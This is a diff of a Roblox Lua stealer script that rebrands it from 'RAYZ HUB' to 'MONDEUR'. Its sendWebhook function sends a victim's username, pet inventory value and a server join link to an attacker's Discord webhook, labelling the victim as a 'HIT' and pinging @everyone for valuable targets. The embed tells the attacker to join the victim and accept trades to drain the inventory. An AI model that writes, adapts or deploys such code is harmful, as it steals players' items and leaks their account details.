@@ -303,23 +303,23 @@ local function sendWebhook(status)
 
     table.insert(previewLines, "=================================")
     table.insert(previewLines, string.format("Total claimed: %.2f / %.2f", claimedValue, totalValue))
-
+local JoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&instanceId=" .. game.JobId
     local payload = {
         content = (totalValue >= 20 and "> @everyone " or "> ").."**".. (totalValue >= 50 and "AMAZING" or (totalValue >= 5 and "DECENT" or "SMALL")) .." HIT • Value: "..string.format("%.2f", totalValue).."**",
-        username = "jeffrey epstein",
+        username = "Mondeur Hit",
         avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
         embeds = {{
-            title = "RAYZ HUB",
-            description = "<:rayz_info:1459657883846185021> **How to Use?**\nJoin the user then jump/chat and accept trades.",
+            title = "MONDEUR",
+            description = "<:MONDEUR🃏> **How to Use?**\nJoin the user then jump/chat and accept trades.",
             color = 0x800080,
             fields = {
                 { name = "Status", value = "```\n" .. displayStatus .. "\n```", inline = false },
-                { name = "<:rayz_diamond:1459279953878188072> Display Name", value = "```"..(LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name).."```", inline = true },
-                { name = "<:rayz_member:1459280047570419814> Username", value = "```"..LocalPlayer.Name.."```", inline = true },
-                { name = "<:rayz_backpack:1459652540630171844> Inventory ("..petCount.." pets)", value = "```"..( #previewLines > 0 and table.concat(previewLines, "\n") or "Empty" ).."```", inline = false },
-                { name = "<:rayz_mod:1459652587409379481>Teleport Script", value = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')\n```", inline = false },
+                { name = "<💎> Display Name", value = "```"..(LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name).."```", inline = true },
+                { name = "<📛> Username", value = "```"..LocalPlayer.Name.."```", inline = true },
+                { name = "<🎒> Inventory ("..petCount.." pets)", value = "```"..( #previewLines > 0 and table.concat(previewLines, "\n") or "Empty" ).."```", inline = false },
+                { name = "🚀 Join Server", value = "**[🎮 Join here](" .. JoinLink .. ")**", inline = false },
             },
-            footer = { text = "RAYZ HUB • Total Value: "..string.format("%.2f", totalValue), icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
+            footer = { text = "Mondeur • Total Value: "..string.format("%.2f", totalValue), icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         }}
     }
